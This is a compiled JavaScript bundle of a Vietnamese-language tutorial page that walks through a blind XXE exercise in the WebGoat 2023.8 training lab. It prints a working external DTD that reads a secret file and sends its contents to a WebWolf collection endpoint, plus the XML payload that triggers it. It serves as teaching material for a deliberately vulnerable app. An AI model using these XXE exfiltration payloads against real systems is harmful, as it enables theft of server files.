"use strict";(self.webpackChunktiennhm_github_io=self.webpackChunktiennhm_github_io||[]).push([[6164],{28453:(e,n,t)=>{t.d(n,{R:()=>c,x:()=>r});var i=t(96540);const s={},o=i.createContext(s);function c(e){const n=i.useContext(o);return i.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function r(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:c(e.components),i.createElement(o.Provider,{value:n},e.children)}},96941:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>l,contentTitle:()=>r,default:()=>h,frontMatter:()=>c,metadata:()=>i,toc:()=>d});const i=JSON.parse('{"id":"web-security/webgoat-2023.8/A5-Security-Misconfiguration/XXE-11","title":"1.11 | XXE","description":"B\xe0i vi\u1ebft n\xe0y s\u1ebd h\u01b0\u1edbng d\u1eabn c\xe1ch t\u1ea5n c\xf4ng XXE tr\xean WebGoat 2023.8","source":"@site/docs/02-web-security/webgoat-2023.8/A5-Security-Misconfiguration/XXE-11.md","sourceDirName":"02-web-security/webgoat-2023.8/A5-Security-Misconfiguration","slug":"/web-security/webgoat-2023.8/A5-Security-Misconfiguration/XXE-11","permalink":"/en/docs/web-security/webgoat-2023.8/A5-Security-Misconfiguration/XXE-11","draft":false,"unlisted":false,"editUrl":"https://github.com/TienNHM/tiennhm.github.io/tree/master/docs/02-web-security/webgoat-2023.8/A5-Security-Misconfiguration/XXE-11.md","tags":[{"inline":true,"label":"web-security","permalink":"/en/docs/tags/web-security"},{"inline":true,"label":"webgoat","permalink":"/en/docs/tags/webgoat"},{"inline":true,"label":"security-misconfiguration","permalink":"/en/docs/tags/security-misconfiguration"},{"inline":true,"label":"xxe","permalink":"/en/docs/tags/xxe"},{"inline":true,"label":"webgoat-2023.8","permalink":"/en/docs/tags/webgoat-2023-8"}],"version":"current","lastUpdatedAt":1755945789000,"sidebarPosition":1,"frontMatter":{"title":"1.11 | XXE","slug":"XXE-11","description":"B\xe0i vi\u1ebft n\xe0y s\u1ebd h\u01b0\u1edbng d\u1eabn c\xe1ch t\u1ea5n c\xf4ng XXE tr\xean WebGoat 2023.8","image":"https://tiennhm.github.io/img/docs/database.jpg","sidebar_position":1,"tags":["web-security","webgoat","security-misconfiguration","xxe","webgoat-2023.8"],"keywords":["web-security","webgoat","security-misconfiguration","xxe","webgoat-2023.8"],"enableComments":true,"draft":false},"sidebar":"tutorialSidebar","previous":{"title":"1.10 | XXE","permalink":"/en/docs/web-security/webgoat-2023.8/A5-Security-Misconfiguration/XXE-10"},"next":{"title":"1.12 | XXE","permalink":"/en/docs/web-security/webgoat-2023.8/A5-Security-Misconfiguration/XXE-12"}}');var s=t(74848),o=t(28453);const c={title:"1.11 | XXE",slug:"XXE-11",description:"B\xe0i vi\u1ebft n\xe0y s\u1ebd h\u01b0\u1edbng d\u1eabn c\xe1ch t\u1ea5n c\xf4ng XXE tr\xean WebGoat 2023.8",image:"https://tiennhm.github.io/img/docs/database.jpg",sidebar_position:1,tags:["web-security","webgoat","security-misconfiguration","xxe","webgoat-2023.8"],keywords:["web-security","webgoat","security-misconfiguration","xxe","webgoat-2023.8"],enableComments:!0,draft:!1},r=void 0,l={},d=[{value:"<strong>1. T\u1ea1o DTD \u0111\u1ec3 \u0111\u1ecdc file v\xe0 g\u1eedi \u0111\u1ebfn WebWolf</strong>",id:"1-t\u1ea1o-dtd-\u0111\u1ec3-\u0111\u1ecdc-file-v\xe0-g\u1eedi-\u0111\u1ebfn-webwolf",level:3},{value:"<strong>2. Upload <code>attack.dtd</code> l\xean WebWolf</strong>",id:"2-upload-attackdtd-l\xean-webwolf",level:3},{value:"<strong>3. G\u1eedi XXE Payload trong WebGoat</strong>",id:"3-g\u1eedi-xxe-payload-trong-webgoat",level:3},{value:"<strong>4. Ki\u1ec3m tra k\u1ebft qu\u1ea3 tr\xean WebWolf</strong>",id:"4-ki\u1ec3m-tra-k\u1ebft-qu\u1ea3-tr\xean-webwolf",level:3},{value:"<strong>5. G\u1eedi n\u1ed9i dung file \u0111\u1ec3 ho\xe0n th\xe0nh b\xe0i t\u1eadp</strong>",id:"5-g\u1eedi-n\u1ed9i-dung-file-\u0111\u1ec3-ho\xe0n-th\xe0nh-b\xe0i-t\u1eadp",level:3},{value:"\ud83d\udccc <strong>T\xf3m t\u1eaft</strong>",id:"-t\xf3m-t\u1eaft",level:3}];function a(e){const n={br:"br",code:"code",h3:"h3",li:"li",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,o.R)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsxs)(n.p,{children:["\u0110\xe2y l\xe0 b\xe0i t\u1eadp Blind XXE n\xe2ng cao, y\xeau c\u1ea7u b\u1ea1n t\u1ea1o m\u1ed9t file DTD \u0111\u1ec3 t\u1ea3i n\u1ed9i dung c\u1ee7a t\u1ec7p ",(0,s.jsx)(n.code,{children:"secret.txt"})," t\u1eeb server WebGoat l\xean WebWolf. D\u01b0\u1edbi \u0111\xe2y l\xe0 h\u01b0\u1edbng d\u1eabn chi ti\u1ebft \u0111\u1ec3 th\u1ef1c hi\u1ec7n b\xe0i n\xe0y."]}),"\n",(0,s.jsx)(n.h3,{id:"1-t\u1ea1o-dtd-\u0111\u1ec3-\u0111\u1ecdc-file-v\xe0-g\u1eedi-\u0111\u1ebfn-webwolf",children:(0,s.jsx)(n.strong,{children:"1. T\u1ea1o DTD \u0111\u1ec3 \u0111\u1ecdc file v\xe0 g\u1eedi \u0111\u1ebfn WebWolf"})}),"\n",(0,s.jsxs)(n.p,{children:["B\u1ea1n c\u1ea7n t\u1ea1o m\u1ed9t file ",(0,s.jsx)(n.strong,{children:(0,s.jsx)(n.code,{children:"attack.dtd"})})," v\xe0 t\u1ea3i n\xf3 l\xean WebWolf. File n\xe0y s\u1ebd ch\u1ee9a \u0111o\u1ea1n m\xe3 sau:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-xml",children:'<?xml version="1.0" encoding="UTF-8"?>\n<!ENTITY % file SYSTEM "file:////home/webgoat/.webgoat-2023.8//XXE/viquocthuan/secret.txt">\n<!ENTITY % send "<!ENTITY send SYSTEM \'http://127.0.0.1:9090/WebWolf/landing?text=%file;\'>">\n%send;\n'})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Gi\u1ea3i th\xedch:"})}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.code,{children:"%file"}),": Truy c\u1eadp n\u1ed9i dung c\u1ee7a file ",(0,s.jsx)(n.code,{children:"secret.txt"})," tr\xean m\xe1y WebGoat."]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.code,{children:"%send"}),": G\u1eedi n\u1ed9i dung c\u1ee7a file ",(0,s.jsx)(n.code,{children:"secret.txt"})," \u0111\u1ebfn endpoint c\u1ee7a WebWolf qua HTTP GET."]}),"\n"]}),"\n",(0,s.jsx)(n.h3,{id:"2-upload-attackdtd-l\xean-webwolf",children:(0,s.jsxs)(n.strong,{children:["2. Upload ",(0,s.jsx)(n.code,{children:"attack.dtd"})," l\xean WebWolf"]})}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsxs)(n.li,{children:["Truy c\u1eadp WebWolf t\u1ea1i ",(0,s.jsx)(n.code,{children:"http://127.0.0.1:9090/WebWolf/home"}),"."]}),"\n",(0,s.jsxs)(n.li,{children:["Trong ph\u1ea7n upload, ch\u1ecdn ",(0,s.jsx)(n.strong,{children:(0,s.jsx)(n.code,{children:"attack.dtd"})})," \u0111\u1ec3 t\u1ea3i l\xean."]}),"\n",(0,s.jsxs)(n.li,{children:["Khi t\u1ea3i l\xean th\xe0nh c\xf4ng, WebWolf s\u1ebd hi\u1ec3n th\u1ecb m\u1ed9t \u0111\u01b0\u1eddng link tr\u1ecf \u0111\u1ebfn file n\xe0y, v\xed d\u1ee5:","\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"http://127.0.0.1:9090/WebWolf/files/username/attack.dtd\n"})}),"\n"]}),"\n"]}),"\n",(0,s.jsx)(n.h3,{id:"3-g\u1eedi-xxe-payload-trong-webgoat",children:(0,s.jsx)(n.strong,{children:"3. G\u1eedi XXE Payload trong WebGoat"})}),"\n",(0,s.jsxs)(n.p,{children:["Khi g\u1eedi request ch\u1ee9a XML, b\u1ea1n c\u1ea7n s\u1eed d\u1ee5ng ",(0,s.jsx)(n.code,{children:"attack.dtd"})," b\u1eb1ng c\xe1ch ch\xe8n v\xe0o request nh\u01b0 sau:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-xml",children:'<?xml version="1.0"?>\n<!DOCTYPE data [\n  <!ENTITY % external SYSTEM "http://127.0.0.1:9090/WebWolf/files/username/attack.dtd">\n  %external;\n]>\n<comment><text>test &send;</text></comment>\n'})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Gi\u1ea3i th\xedch:"})}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.code,{children:"%external;"}),": Load file ",(0,s.jsx)(n.code,{children:"attack.dtd"})," t\u1eeb WebWolf."]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.code,{children:"&send;"}),": K\xedch ho\u1ea1t g\u1eedi n\u1ed9i dung file ",(0,s.jsx)(n.code,{children:"secret.txt"})," \u0111\u1ebfn WebWolf."]}),"\n"]}),"\n",(0,s.jsx)(n.h3,{id:"4-ki\u1ec3m-tra-k\u1ebft-qu\u1ea3-tr\xean-webwolf",children:(0,s.jsx)(n.strong,{children:"4. Ki\u1ec3m tra k\u1ebft qu\u1ea3 tr\xean WebWolf"})}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsxs)(n.li,{children:["Truy c\u1eadp ",(0,s.jsx)(n.strong,{children:"WebWolf > Incoming requests"}),"."]}),"\n",(0,s.jsxs)(n.li,{children:["N\u1ebfu th\xe0nh c\xf4ng, b\u1ea1n s\u1ebd th\u1ea5y m\u1ed9t request ch\u1ee9a n\u1ed9i dung file ",(0,s.jsx)(n.code,{children:"secret.txt"})," trong tham s\u1ed1 ",(0,s.jsx)(n.code,{children:"text"}),"."]}),"\n"]}),"\n",(0,s.jsx)(n.h3,{id:"5-g\u1eedi-n\u1ed9i-dung-file-\u0111\u1ec3-ho\xe0n-th\xe0nh-b\xe0i-t\u1eadp",children:(0,s.jsx)(n.strong,{children:"5. G\u1eedi n\u1ed9i dung file \u0111\u1ec3 ho\xe0n th\xe0nh b\xe0i t\u1eadp"})}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsxs)(n.li,{children:["Copy n\u1ed9i dung ",(0,s.jsx)(n.code,{children:"secret.txt"})," m\xe0 b\u1ea1n nh\u1eadn \u0111\u01b0\u1ee3c t\u1eeb WebWolf."]}),"\n",(0,s.jsx)(n.li,{children:"Quay l\u1ea1i WebGoat, post m\u1ed9t comment ch\u1ee9a n\u1ed9i dung n\xe0y \u0111\u1ec3 ho\xe0n th\xe0nh b\xe0i t\u1eadp."}),"\n"]}),"\n",(0,s.jsxs)(n.h3,{id:"-t\xf3m-t\u1eaft",children:["\ud83d\udccc ",(0,s.jsx)(n.strong,{children:"T\xf3m t\u1eaft"})]}),"\n",(0,s.jsxs)(n.p,{children:["\u2714 T\u1ea1o file ",(0,s.jsx)(n.code,{children:"attack.dtd"})," \u0111\u1ec3 \u0111\u1ecdc file v\xe0 g\u1eedi \u0111\u1ebfn WebWolf.",(0,s.jsx)(n.br,{}),"\n","\u2714 Upload ",(0,s.jsx)(n.code,{children:"attack.dtd"})," l\xean WebWolf.",(0,s.jsx)(n.br,{}),"\n","\u2714 G\u1eedi XML request \u0111\u1ebfn WebGoat \u0111\u1ec3 k\xedch ho\u1ea1t XXE.",(0,s.jsx)(n.br,{}),"\n","\u2714 Xem n\u1ed9i dung file ",(0,s.jsx)(n.code,{children:"secret.txt"})," trong WebWolf.",(0,s.jsx)(n.br,{}),"\n","\u2714 Post n\u1ed9i dung \u0111\u1ec3 ho\xe0n th\xe0nh b\xe0i t\u1eadp."]}),"\n",(0,s.jsx)(n.p,{children:"N\u1ebfu c\xf3 l\u1ed7i ho\u1eb7c kh\xf4ng th\u1ea5y n\u1ed9i dung file, ki\u1ec3m tra l\u1ea1i:"}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsxs)(n.li,{children:["\u0110\u01b0\u1eddng d\u1eabn file ",(0,s.jsx)(n.code,{children:"secret.txt"})," c\xf3 ch\xednh x\xe1c kh\xf4ng."]}),"\n",(0,s.jsx)(n.li,{children:"WebWolf c\xf3 nh\u1eadn \u0111\u01b0\u1ee3c request kh\xf4ng (ki\u1ec3m tra log)."}),"\n",(0,s.jsx)(n.li,{children:"C\xf3 ch\u1eb7n firewall n\xe0o ng\u0103n ch\u1eb7n request ra ngo\xe0i kh\xf4ng."}),"\n"]})]})}function h(e={}){const{wrapper:n}={...(0,o.R)(),...e.components};return n?(0,s.jsx)(n,{...e,children:(0,s.jsx)(a,{...e})}):a(e)}}}]);